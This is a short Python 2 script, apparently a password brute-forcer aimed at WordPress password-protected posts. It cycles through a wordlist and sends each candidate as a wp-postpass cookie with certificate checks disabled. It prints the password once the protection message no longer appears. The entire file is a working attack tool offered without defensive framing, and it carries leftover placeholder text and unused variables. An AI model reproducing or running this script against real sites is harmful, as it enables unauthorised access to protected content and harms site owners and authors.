import requests
import subprocess
import sys
import re
import time

url = sys.argv[1]
user = sys.argv[2]
wordlist = sys.argv[3]
username_field = "log"
password_field = "post_password"
start_time = int(time.time())

i = 0
f = open(wordlist,'r')


for password in f:

	try:
		password = password.strip()
		cookies = {'wordpress_test_cookie':'WP+Cookie+check','wp-postpass_3d87e2a5f32fab60019bc50b1cdf47e6':password}
		#payload = {password_field: password,"Submit":"Submit"}
		#cookies = r.cookies
		r = requests.get(url, verify=False,cookies=cookies)
		#print r.text
		if("awdawdawd awdawdawdawdawdawdawdaw" in str(r.text)):
			print "Error: User doesn't exist"
			break
		if("This post is password protected" not in str(r.text)):
			#print str(r.text)
			print "Found Password("+user+"): "+password
			break
	except:
		print "Error with: "+url
		break
	i += 1
	if(i % 100 == 0):
		print str(i)+" attempts"
		print str(100 / (int(time.time())-start_time))+" attempts/second"
		start_time = int(time.time())
